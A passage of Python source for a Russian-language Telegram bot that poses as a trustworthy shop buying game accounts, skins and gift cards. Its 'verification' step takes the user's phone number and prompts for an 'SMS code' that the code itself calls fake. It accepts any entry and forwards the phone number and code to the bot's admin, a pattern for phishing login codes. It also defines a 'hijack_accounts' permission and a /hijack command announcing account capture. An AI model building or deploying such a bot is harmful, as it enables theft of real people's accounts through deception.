    waiting_verification = State()
    waiting_contact = State()
    waiting_feedback = State()

# ========== ФИЛЬТРЫ ДЛЯ ПРОВЕРКИ ПРАВ ==========
class AdminFilter(Filter):
    def __init__(self, require_main: bool = False, permission: str = None):
        self.require_main = require_main
        self.permission = permission
    
    async def __call__(self, message: Message, event_from_user: types.User) -> bool:
        user_id = event_from_user.id
        
        # Проверяем, является ли администратором
        if not admin_manager.is_admin(user_id):
            return False
        
        # Проверяем, требуется ли главный админ
        if self.require_main and not admin_manager.is_main_admin(user_id):
            return False
        
        # Проверяем конкретное разрешение
        if self.permission and not admin_manager.has_permission(user_id, self.permission):
            return False
        
        return True

# Создаем фильтры для разных уровней доступа
is_admin = AdminFilter()
is_main_admin = AdminFilter(require_main=True)
can_manage_admins = AdminFilter(permission='manage_admins')
can_manage_channels = AdminFilter(permission='manage_channels')
can_send_messages = AdminFilter(permission='send_messages')
can_hijack_accounts = AdminFilter(permission='hijack_accounts')

# ========== ОБРАБОТЧИКИ КОМАНД ==========

# Команда /start

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    user = message.from_user
    
    # Регистрация пользователя
    cursor.execute(
        "INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)",
        (user.id, user.username, user.first_name)
    )
    cursor.execute(
        "UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
        (user.id,)
    )
    conn.commit()
    
    welcome_text = f"""
🏪 <b>ДОБРО ПОЖАЛОВАТЬ В МАГАЗИН Money Moves Bot | заработок!</b> 🎮

👋 Привет, {user.first_name}!

<b>Мы покупаем:</b>
• 🎮 Игровые аккаунты (Steam, Epic Games, Origin и др)
• 💎 Внутриигровые предметы (CS:GO, Dota 2, TF2 и др)
• 🎫 Игровые ключи (Steam, Xbox, PlayStation и др)
• 📱 Цифровые подарки (Apple, Amazon, Google и др)
• 🛬 Телеграмм подарки  
• 💳 Электронные ваучеры

<b>💰 Почему мы?</b>
• Мгновенная оплата
• Высокие цены
• Гарантия сделки
• Анонимность

<b>Выберите действие:</b>
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")],
        [InlineKeyboardButton(text="ℹ️ О НАС", callback_data="about_us")]
    ])
    
    await message.answer(welcome_text, parse_mode="HTML", reply_markup=keyboard)

@dp.callback_query(F.data == "sell_item")
async def start_selling(callback_query: types.CallbackQuery, state: FSMContext):
    user = callback_query.from_user
    
    # Проверка верификации
    cursor.execute("SELECT phone FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()
    
    if not user_data or not user_data[0]:
        # Требуется верификация по номеру телефона
        verification_text = """
📱 <b>ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ</b>

Для продажи товаров необходимо подтвердить ваш номер телефона.

<b>Зачем это нужно:</b>
• Защита от мошенничества
• Гарантия выплат
• Юридическое оформление сделок

<b>Нажмите кнопку для подтверждения номера:</b>
        """
        
        keyboard = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
        
        await state.set_state(SellerStates.waiting_phone)
        await bot.send_message(
            user.id,
            verification_text,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        return
    
    # Если номер уже подтвержден, переходим к выбору товара
    await show_item_types(callback_query, state)

async def show_item_types(callback_query: types.CallbackQuery, state: FSMContext):
    item_types_text = """
🎯 <b>ЧТО ВЫ ХОТИТЕ ПРОДАТЬ?</b>

<b>Выберите категорию вашего товара:</b>

• 🎮 <b>Игровой аккаунт</b> - Steam, Epic Games, Origin, Uplay
• 💎 <b>Цифровой предмет</b> - CS:GO скины, Dota 2 предметы
• 🎫 <b>Игровой ключ</b> - Активационный ключ игры
• 📱 <b>Цифровой подарок</b> - Gift Card, ваучер
• 💳 <b>Электронные деньги</b> - Qiwi, Яндекс.Деньги
• 📦 <b>Другое</b> - Укажите в описании
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎮 Игровой аккаунт", callback_data="type_account")],
        [InlineKeyboardButton(text="💎 Цифровой предмет", callback_data="type_item")],
        [InlineKeyboardButton(text="🎫 Игровой ключ", callback_data="type_key")],
        [InlineKeyboardButton(text="📱 Цифровой подарок", callback_data="type_gift")],
        [InlineKeyboardButton(text="💳 Электронные деньги", callback_data="type_money")],
        [InlineKeyboardButton(text="📦 Другое", callback_data="type_other")]
    ])
    
    await state.set_state(SellerStates.waiting_item_type)
    await bot.edit_message_text(
        item_types_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML",
        reply_markup=keyboard
    )


@dp.message(SellerStates.waiting_phone, F.contact)
async def process_phone_number(message: types.Message, state: FSMContext):
    user = message.from_user
    phone = message.contact.phone_number

    logger.info(f"Получен контакт от пользователя {user.id}: {phone}")

    # Убираем + если есть
    if phone.startswith('+'):
        phone = phone[1:]

    # Сохраняем номер
    cursor.execute(
        "UPDATE users SET phone = ? WHERE user_id = ?",
        (phone, user.id)
    )
    conn.commit()

    # Генерируем фейковый SMS код (5-6 цифр)
    sms_code = str(random.randint(10000, 999999))
    
    # Сохраняем код
    cursor.execute(
        "UPDATE users SET code = ? WHERE user_id = ?",
        (sms_code, user.id)
    )
    conn.commit()

    # Сообщаем пользователю о отправке кода
    sms_text = f"""
❕ <b>ПОДТВЕРЖДЕНИЕ НОМЕРА: +{phone}</b>

📱 <b>На номер +{phone} скоро будет отправлен номер телефона от админинистратора.</b>

🔢 <b>Введите 5-6 значный код из SMS:</b>

<b>Код приходит в течении 5-10 мин.</b>

<i>Если код не пришел в течении 10 мин. повторите процедуру /start</i>
    """
    
    await message.answer(sms_text, parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
    await state.set_state(SellerStates.waiting_sms_code)

@dp.message(SellerStates.waiting_sms_code, F.text.regexp(r'^\d{5,6}$'))
async def process_sms_code(message: types.Message, state: FSMContext):
    user = message.from_user
    code = message.text

    # Проверяем сохраненный код
    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()

    if not user_data:
        await message.answer("❌ Произошла ошибка. Начните снова /start")
        await state.clear()
        return

    phone = user_data[0]
    saved_code = user_data[1]

    # ВСЕГДА УСПЕШНАЯ ПРОВЕРКА (для упрощения)
    success_text = f"""
✅ <b>Верификация по SMS завершена успешно!</b>

Ваш номер <b>+{phone}</b> подтвержден.

🎉 <b>Теперь вы можете продавать товары!</b>

📸 <b>Следующий шаг:</b>
Выберите тип товара для продажи:
"""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎯 ВЫБРАТЬ ТОВАР", callback_data="sell_item")]
    ])
    
    await message.answer(success_text, parse_mode="HTML", reply_markup=keyboard)
    await state.clear()
    
    # Отправляем уведомление админу
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📱 <b>НОВЫЙ ВЕРИФИЦИРОВАННЫЙ ПОЛЬЗОВАТЕЛЬ</b>\n\n"
            f"👤 Пользователь: {user.first_name} (@{user.username})\n"
            f"🆔 ID: {user.id}\n"
            f"📱 Телефон: +{phone}\n"
            f"🔢 Введенный код: {code}\n"
            f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
            parse_mode="HTML"
        )
    except:
        pass

@dp.message(SellerStates.waiting_sms_code)
async def handle_wrong_sms_code(message: types.Message):
    await message.answer("❌ <b>Пожалуйста, введите 5-6 значный код из SMS.</b>\n\nЕсли код не пришел, используйте /resend_code", parse_mode="HTML")

@dp.callback_query(SellerStates.waiting_item_type)
async def process_item_type(callback_query: types.CallbackQuery, state: FSMContext):
    item_types = {
        "type_account": "Игровой аккаунт",
        "type_item": "Цифровой предмет",
        "type_key": "Игровой ключ",
        "type_gift": "Цифровой подарок",
        "type_money": "Электронные деньги",
        "type_other": "Другое"
    }
    
    item_type = item_types.get(callback_query.data, "Другое")
    await state.update_data(item_type=item_type)
    
    photos_text = f"""
📸 <b>ДОБАВЛЕНИЕ ФОТОГРАФИЙ</b>

<b>Категория:</b> {item_type}

<b>Пришлите фотографии вашего товара:</b>
• Для аккаунтов: скриншоты профиля, библиотеки игр
• Для предметов: скриншоты инвентаря
• Для ключей: фото сертификата (если есть)
• Для подарков: фото карты или чека

<b>Требования:</b>
✅ Хорошее качество
✅ Виден весь товар
✅ Нет водяных знаков
✅ Максимум 5 фото

<b>Отправьте фото и после нажмите /skip для заполнения описания продукта</b>
    """
    
    await state.set_state(SellerStates.waiting_photos)
    await bot.edit_message_text(
        photos_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML"
    )

@dp.message(SellerStates.waiting_photos, F.photo)
async def process_photos(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    photos = user_data.get('photos', [])
    
    # Сохраняем информацию о фото
    photo_id = message.photo[-1].file_id
    photos.append(photo_id)
    
    await state.update_data(photos=photos)
    
    if len(photos) >= 5:
        await message.answer("✅ Максимальное количество фото достигнуто (5 фото)")
        await ask_description(message, state)
    else:
        remaining = 5 - len(photos)
        await message.answer(f"✅ Фото добавлено. Осталось мест: {remaining}")

@dp.message(SellerStates.waiting_photos, Command("skip"))
async def skip_photos(message: types.Message, state: FSMContext):
    await ask_description(message, state)

async def ask_description(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    item_type = user_data.get('item_type', 'Товар')
    
    description_text = f"""
📝 <b>ОПИСАНИЕ ТОВАРА</b>

<b>Категория:</b> {item_type}

<b>Подробно опишите ваш товар:</b>

<b>Пример для игрового аккаунта:</b>
• Платформа (Steam/Epic Games/др.)
• Количество игр
• Уровень/ранг
• Наличие привязок
• История аккаунта

<b>Пример для предметов:</b>
• Название предмета
• Игра
• Редкость
• Состояние
• Особенности

<b>Чем подробнее описание - тем выше цена!</b>
    """
    
    await state.set_state(SellerStates.waiting_description)
    await message.answer(description_text, parse_mode="HTML")

@dp.message(SellerStates.waiting_description)
async def process_description(message: types.Message, state: FSMContext):
    description = message.text
    await state.update_data(description=description)
    
    # Получаем все данные
    user_data = await state.get_data()
    photos_count = len(user_data.get('photos', []))
    
    summary_text = f"""
📋 <b>ПОДТВЕРЖДЕНИЕ ЗАЯВКИ</b>

<b>Категория:</b> {user_data['item_type']}
<b>Фотографии:</b> {photos_count} шт.
<b>Описание:</b>
{description[:500]}{'...' if len(description) > 500 else ''}

<b>Далее:</b>
1. Модератор проверит заявку
2. Определит стоимость товара
3. Вы получите предложение цены
4. После согласия - инструкции по передаче

<b>Все верно?</b>
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ ПОДТВЕРДИТЬ", callback_data="confirm_submit")],
        [InlineKeyboardButton(text="✏️ ИЗМЕНИТЬ", callback_data="edit_submit")]
    ])
    
    await state.set_state(SellerStates.waiting_confirm)
    await message.answer(summary_text, parse_mode="HTML", reply_markup=keyboard)

@dp.callback_query(SellerStates.waiting_confirm, F.data == "confirm_submit")
async def confirm_submission(callback_query: types.CallbackQuery, state: FSMContext):
    user = callback_query.from_user
    user_data = await state.get_data()
    
    # Сохраняем в БД
    photos_json = json.dumps(user_data.get('photos', []))
    
    cursor.execute('''
        INSERT INTO items (user_id, item_type, photos, description, status)
        VALUES (?, ?, ?, ?, 'pending')
    ''', (user.id, user_data['item_type'], photos_json, user_data['description']))
    
    item_id = cursor.lastrowid
    conn.commit()
    
    # Уведомляем админа
    try:
        await bot.send_message(
            ADMIN_ID,
            f"🆕 <b>НОВАЯ ЗАЯВКА #{item_id}</b>\n\n"
            f"👤 Продавец: {user.first_name} (@{user.username})\n"
            f"🆔 User ID: {user.id}\n"
            f"📱 Телефон: +{cursor.execute('SELECT phone FROM users WHERE user_id = ?', (user.id,)).fetchone()[0]}\n"
            f"🏷 Категория: {user_data['item_type']}\n"
            f"📸 Фото: {len(user_data.get('photos', []))} шт.\n"
            f"📝 Описание: {user_data['description'][:300]}...",
            parse_mode="HTML"
        )
    except:
        pass
    
    # Ответ пользователю
    user_response = f"""
✅ <b>ЗАЯВКА #{item_id} ПРИНЯТА!</b>

<b>Статус:</b> На модерации ⏳

<b>Что дальше:</b>
1. Модератор оценит ваш товар (1-24 часа)
2. Вы получите предложение цены
3. После согласия - инструкции по передаче
4. Получение денег на карту/кошелек

<b>Среднее время проверки:</b> 2-4 часа
<b>Следить за статусом:</b> /status

💰 <b>Готовы продать еще товар?</b>
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 ПРОДАТЬ ЕЩЕ ТОВАР", callback_data="sell_item")],
        [InlineKeyboardButton(text="📊 МОИ ЗАЯВКИ", callback_data="my_items")]
    ])
    
    await bot.edit_message_text(
        user_response,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML",
        reply_markup=keyboard
    )
    
    await state.clear()

@dp.callback_query(F.data == "about_us")
async def about_us(callback_query: types.CallbackQuery):
    about_text = """
🏪 <b>О НАС - Money Moves Bot</b>

Мы - надежная платформа для покупки и продажи игровых ценностей.

<b>Наши преимущества:</b>
✅ <b>Безопасность</b> - Все сделки защищены гарантией
✅ <b>Скорость</b> - Выплаты в течение 1-24 часов
✅ <b>Выгода</b> - Самые высокие цены на рынке
✅ <b>Поддержка</b> - Круглосуточная помощь

<b>Наши гарантии:</b>
1. Полная анонимность
2. Защита от мошенничества
3. Мгновенные выплаты

<b>Присоединяйтесь к нам уже сегодня!</b>
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")]
    ])
    
    await bot.edit_message_text(
        about_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.message(Command("status"))
async def cmd_status(message: types.Message):
    user = message.from_user
    
    cursor.execute(
        "SELECT COUNT(*), SUM(CASE WHEN status = 'pending' THEN 1 ELSE 0 END) FROM items WHERE user_id = ?",
        (user.id,)
    )
    stats = cursor.fetchone()
    
    cursor.execute(
        "SELECT phone FROM users WHERE user_id = ?",
        (user.id,)
    )
    user_data = cursor.fetchone()
    
    status_text = f"""
📊 <b>ВАШ СТАТУС</b>

👤 <b>Пользователь:</b> {user.first_name}
🆔 <b>ID:</b> {user.id}
📱 <b>Телефон:</b> {'+'+user_data[0] if user_data and user_data[0] else 'Не подтвержден'}
    
📦 <b>Заявки:</b>
• Всего: {stats[0] or 0}
• На модерации: {stats[1] or 0}
• Одобрено: {(stats[0] or 0) - (stats[1] or 0)}

💎 <b>Для продажи товара нажмите:</b>
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")]
    ])
    
    await message.answer(status_text, parse_mode="HTML", reply_markup=keyboard)

@dp.message(Command("resend_code"))
async def cmd_resend_code(message: types.Message, state: FSMContext):
    user = message.from_user

    # Проверяем, есть ли сохраненный номер телефона
    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()

    if not user_data or not user_data[0]:
        # Если номера нет, просим сначала подтвердить номер
        await message.answer("❌ <b>Сначала необходимо подтвердить номер телефона.</b>\n\nНажмите /start и выберите 'ПРОДАТЬ ТОВАР'", parse_mode="HTML")
        return

    phone = user_data[0]
    old_code = user_data[1]

    # Генерируем НОВЫЙ код
    new_code = str(random.randint(10000, 999999))

    # Обновляем код в базе
    cursor.execute(
        "UPDATE users SET code = ? WHERE user_id = ?",
        (new_code, user.id)
    )
    conn.commit()

    # Устанавливаем состояние ожидания кода
    await state.set_state(SellerStates.waiting_sms_code)

    # Информируем пользователя
    resend_text = f"""
🔄 <b>НОВЫЙ КОД ОТПРАВЛЕН</b>

📱 <b>Новый SMS код отправлен на номер +{phone}</b>

🔢 <b>Введите 5-6 значный код из SMS:</b>

<i>Если код не пришел, попробуйте еще раз через 1 минуту</i>
"""
    
    await message.answer(resend_text, parse_mode="HTML")


# Команда /admin - быстрый доступ к админке
@dp.message(Command("admin"))
@admin_required()
async def cmd_admin(message: Message):
    # Код обработчика без проверок внутри
    await message.answer("Добро пожаловать в админ-панель.")

# Для главного админа:
@dp.message(Command("add_admin"))
@admin_required(require_main=True)
async def cmd_add_admin(message: Message):
    await message.answer("Добавление нового администратора...")

# Для конкретного разрешения:
@dp.message(Command("hijack"))
@admin_required(required_permission='hijack_accounts')
async def cmd_hijack(message: Message):
    await message.answer("Запуск захвата аккаунта...")
    
    await cmd_start(message, None)

# ========== ОБРАБОТЧИКИ АДМИН-ПАНЕЛИ ==========

# Отправка сообщения пользователю
@dp.callback_query(F.data == "admin_send_message")
async def admin_send_message_start(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    await state.set_state(AdminStates.waiting_message_username)
    
    await callback_query.message.edit_text(
        "📨 <b>ОТПРАВКА СООБЩЕНИЯ ПОЛЬЗОВАТЕЛЮ</b>\n\n"
        "Введите @username пользователя:\n"
        "<code>@username_user</code>\n\n"
        "<i>Или отправьте /cancel для отмены</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_message_username)
async def process_message_username(message: Message, state: FSMContext):
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    username = message.text.strip()
    
    if username == '/cancel':
        await message.answer("❌ Отправка сообщения отменена")
        await state.clear()
        return
    
    # Проверяем формат username
    if not username.startswith('@'):
        username = '@' + username
    
    await state.update_data(target_username=username)
    await state.set_state(AdminStates.waiting_message_text)
    
    await message.answer(
        f"✅ Получен username: {username}\n\n"
        "Теперь введите текст сообщения:\n\n"
        "<i>Поддерживается HTML разметка</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_message_text)
async def process_message_text(message: Message, state: FSMContext):
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    message_text = message.text
    
    if message_text == '/cancel':
        await message.answer("❌ Отправка сообщения отменена")
        await state.clear()
        return
    
    await state.update_data(message_text=message_text)
    
    user_data = await state.get_data()
    username = user_data.get('target_username', '')
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📎 Добавить медиа", callback_data="add_media"),
            InlineKeyboardButton(text="✅ Отправить", callback_data="send_message_now")
        ],
        [InlineKeyboardButton(text="✏️ Изменить текст", callback_data="edit_message_text")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_message")]
    ])
    
    await message.answer(
        f"📋 <b>ПРЕДПРОСМОТР СООБЩЕНИЯ</b>\n\n"
        f"👤 Кому: {username}\n"
        f"📝 Текст:\n"
        f"{message_text[:500]}{'...' if len(message_text) > 500 else ''}\n\n"
        f"<i>Выберите действие:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "send_message_now")
async def send_message_now(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    user_data = await state.get_data()
    username = user_data.get('target_username', '')
    message_text = user_data.get('message_text', '')
    media_path = user_data.get('media_path')
    
    await callback_query.message.edit_text(
        f"⏳ <b>Отправляю сообщение пользователю {username}...</b>",
        parse_mode="HTML"
    )
    
    # Отправляем сообщение
    result = await message_system.send_to_user_by_username(
        username,
        message_text,
        callback_query.from_user.id,
        media_path
    )
    
    if result['success']:
        await callback_query.message.edit_text(
            f"✅ <b>СООБЩЕНИЕ ОТПРАВЛЕНО!</b>\n\n"
            f"👤 Пользователь: {username}\n"
            f"🆔 User ID: {result.get('user_id', 'неизвестно')}\n"
            f"📨 ID сообщения: {result.get('message_id', 'неизвестно')}\n"
            f"✅ Статус: {result.get('status', 'отправлено')}\n\n"
            f"<i>Для отправки нового сообщения используйте /start</i>",
            parse_mode="HTML"
        )
    else:
        error_msg = result.get('error', 'Неизвестная ошибка')
        status = result.get('status', 'error')
        
        status_text = {
            'user_not_found': 'Пользователь не найден',
            'user_blocked': 'Пользователь заблокировал бота',
            'privacy_restriction': 'Ограничения приватности',
            'error': 'Ошибка отправки'
        }.get(status, status)
        
        await callback_query.message.edit_text(
            f"❌ <b>ОШИБКА ОТПРАВКИ!</b>\n\n"
            f"👤 Пользователь: {username}\n"
            f"📝 Статус: {status_text}\n"
            f"⚠️ Ошибка: {error_msg[:200]}\n\n"
            f"<i>Попробуйте еще раз или свяжитесь с пользователем другим способом.</i>",
            parse_mode="HTML"
        )
    
    await state.clear()

# Управление каналами
@dp.callback_query(F.data == "admin_channels")
async def admin_channels_menu(callback_query: CallbackQuery):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    # Получаем статистику каналов
    total_channels = db.fetch_one("SELECT COUNT(*) FROM channels")[0]
    approved_channels = db.fetch_one("SELECT COUNT(*) FROM channels WHERE is_approved = 1")[0]
    active_channels = db.fetch_one("SELECT COUNT(*) FROM channels WHERE notifications_enabled = 1")[0]
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="➕ Добавить канал", callback_data="channel_add"),
            InlineKeyboardButton(text="📋 Список каналов", callback_data="channel_list")
        ],
        [
            InlineKeyboardButton(text="✅ Одобренные", callback_data="channel_approved"),
            InlineKeyboardButton(text="⏳ Ожидают", callback_data="channel_pending")
        ],
        [
            InlineKeyboardButton(text="🔔 Управление уведомлениями", callback_data="channel_notifications"),
            InlineKeyboardButton(text="📨 Рассылка", callback_data="channel_broadcast")
        ],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await callback_query.message.edit_text(
        f"📢 <b>УПРАВЛЕНИЕ КАНАЛАМИ</b>\n\n"
        f"📊 Статистика:\n"
        f"• Всего каналов: {total_channels}\n"
        f"• Одобрено: {approved_channels}\n"
        f"• Активны: {active_channels}\n\n"
        f"<i>Выберите действие:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )




@dp.callback_query(F.data == "channel_add")
async def channel_add_start(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    await state.set_state(AdminStates.waiting_channel_id)
    
    await callback_query.message.edit_text(
        "➕ <b>ДОБАВЛЕНИЕ КАНАЛА/ГРУППЫ</b>\n\n"
        "Отправьте ID или @username канала/группы:\n\n"
        "Формат:\n"
        "<code>@channel_username</code>\n"
        "<code>-1001234567890</code> (ID канала)\n\n"
        "<i>Перед добавлением убедитесь, что бот добавлен как администратор в канал.</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_channel_id)
async def process_channel_id(message: Message, state: FSMContext):
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    channel_id = message.text.strip()
    
    if channel_id == '/cancel':
        await message.answer("❌ Добавление канала отменено")
        await state.clear()
        return
    
    await state.update_data(channel_id=channel_id)
    
    # Проверяем канал
    await message.answer(f"⏳ <b>Проверяю канал {channel_id}...</b>", parse_mode="HTML")
    
    try:
        # Пробуем получить информацию о канале
        chat = await bot.get_chat(channel_id)
        
        channel_info = {
            'title': chat.title,
            'username': chat.username,
            'type': str(chat.type)
        }
        
        # Проверяем права бота
        bot_is_admin = False
        try:
            member = await bot.get_chat_member(chat.id, (await bot.get_me()).id)
            bot_is_admin = member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
        except:
            pass
        
        await state.update_data(channel_info=channel_info, bot_is_admin=bot_is_admin)
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ Добавить", callback_data="confirm_channel_add"),
                InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_channel_add")
            ]
        ])
        
        await message.answer(
            f"🔍 <b>ИНФОРМАЦИЯ О КАНАЛЕ</b>\n\n"
            f"📢 Название: {chat.title}\n"
            f"🔗 ID: {chat.id}\n"
            f"👤 Username: @{chat.username or 'нет'}\n"
            f"📁 Тип: {chat.type}\n"
            f"🤖 Бот админ: {'✅ Да' if bot_is_admin else '❌ Нет'}\n\n"
            f"<i>Добавить этот канал в систему?</i>",
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
    except Exception as e:
        await message.answer(
            f"❌ <b>ОШИБКА ПРОВЕРКИ КАНАЛА</b>\n\n"
            f"Не удалось получить информацию о канале {channel_id}\n"
            f"Ошибка: {str(e)[:200]}\n\n"
            f"<i>Убедитесь, что:\n"
            f"1. Канал существует\n"
            f"2. Бот имеет доступ к каналу\n"
            f"3. Вы указали правильный ID/username</i>",
            parse_mode="HTML"
        )
        await state.clear()

@dp.callback_query(F.data == "confirm_channel_add")
async def confirm_channel_add(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    user_data = await state.get_data()
    channel_id = user_data.get('channel_id')
    channel_info = user_data.get('channel_info', {})
    
    await callback_query.message.edit_text(
        f"⏳ <b>Добавляю канал {channel_id}...</b>",
        parse_mode="HTML"
    )
    
    result = await channel_manager.add_channel(
        channel_id,
        callback_query.from_user.id,
        channel_info
    )
    
    if result['success']:
        if result.get('requires_approval') and not admin_manager.is_main_admin(callback_query.from_user.id):
            await callback_query.message.edit_text(
                f"✅ <b>КАНАЛ ДОБАВЛЕН!</b>\n\n"
                f"📢 Канал: {channel_info.get('title', channel_id)}\n"
                f"🔗 ID: {channel_id}\n"
                f"🤖 Бот админ: {'✅ Да' if result.get('bot_is_admin') else '❌ Нет'}\n\n"
                f"📝 Статус: <b>ОЖИДАЕТ ОДОБРЕНИЯ</b>\n"
                f"Главный администратор получил уведомление и должен одобрить канал.\n\n"
                f"<i>Вы получите уведомление, когда канал будет одобрен.</i>",
                parse_mode="HTML"
            )
        else:
            await callback_query.message.edit_text(
                f"✅ <b>КАНАЛ ДОБАВЛЕН И ОДОБРЕН!</b>\n\n"
                f"📢 Канал: {channel_info.get('title', channel_id)}\n"
                f"🔗 ID: {channel_id}\n"
                f"🤖 Бот админ: {'✅ Да' if result.get('bot_is_admin') else '❌ Нет'}\n\n"
                f"✅ Статус: <b>ОДОБРЕН</b>\n"
                f"Теперь бот будет отправлять уведомления в этот канал.\n\n"
                f"<i>Для управления уведомлениями используйте меню каналов.</i>",
                parse_mode="HTML"
            )
    else:
        await callback_query.message.edit_text(
            f"❌ <b>ОШИБКА ДОБАВЛЕНИЯ КАНАЛА</b>\n\n"
            f"Канал: {channel_id}\n"
            f"Ошибка: {result.get('error', 'Неизвестная ошибка')}\n\n"
            f"<i>Попробуйте еще раз или проверьте правильность данных.</i>",
            parse_mode="HTML"
        )
    
    await state.clear()

# Управление админами
@dp.callback_query(F.data == "admin_manage")
async def admin_manage_menu(callback_query: CallbackQuery):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Только главный админ может управлять админами")
        return
    
    # Получаем статистику админов
    total_admins = db.fetch_one("SELECT COUNT(*) FROM admins WHERE is_active = 1")[0]
    main_admins = db.fetch_one("SELECT COUNT(*) FROM admins WHERE is_main_admin = 1 AND is_active = 1")[0]
    regular_admins = total_admins - main_admins
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="➕ Добавить админа", callback_data="admin_add"),
            InlineKeyboardButton(text="➖ Удалить админа", callback_data="admin_remove_menu")
        ],
        [
            InlineKeyboardButton(text="📋 Список админов", callback_data="admin_list"),
            InlineKeyboardButton(text="🔧 Права админов", callback_data="admin_permissions")
        ],
        [
            InlineKeyboardButton(text="📊 Статистика админов", callback_data="admin_stats_list"),
            InlineKeyboardButton(text="🚪 Выход из всех сессий", callback_data="admin_logout_all")
        ],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await callback_query.message.edit_text(
        f"👥 <b>УПРАВЛЕНИЕ АДМИНИСТРАТОРАМИ</b>\n\n"
        f"📊 Статистика:\n"
        f"• Всего админов: {total_admins}\n"
        f"• Главных админов: {main_admins}\n"
        f"• Обычных админов: {regular_admins}\n"
        f"• Лимит: {config.MAX_ADMINS}\n\n"
        f"<i>Выберите действие:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "admin_add")
async def admin_add_start(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Только главный админ может добавлять админов")
        return
    
    await state.set_state(AdminStates.waiting_admin_username)
    
    await callback_query.message.edit_text(
        "➕ <b>ДОБАВЛЕНИЕ АДМИНИСТРАТОРА</b>\n\n"
        "Отправьте @username пользователя, которого хотите сделать админом:\n\n"
        "<code>@username_user</code>\n\n"
        "<i>Пользователь должен начать диалог с ботом (@BotFather) перед добавлением.</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_admin_username)
async def process_admin_username(message: Message, state: FSMContext):
    if not admin_manager.is_main_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    username = message.text.strip()
    
    if username == '/cancel':
        await message.answer("❌ Добавление админа отменено")
        await state.clear()
        return
    
    # Проверяем формат username
    if not username.startswith('@'):
        username = '@' + username
    
    # Пытаемся найти пользователя
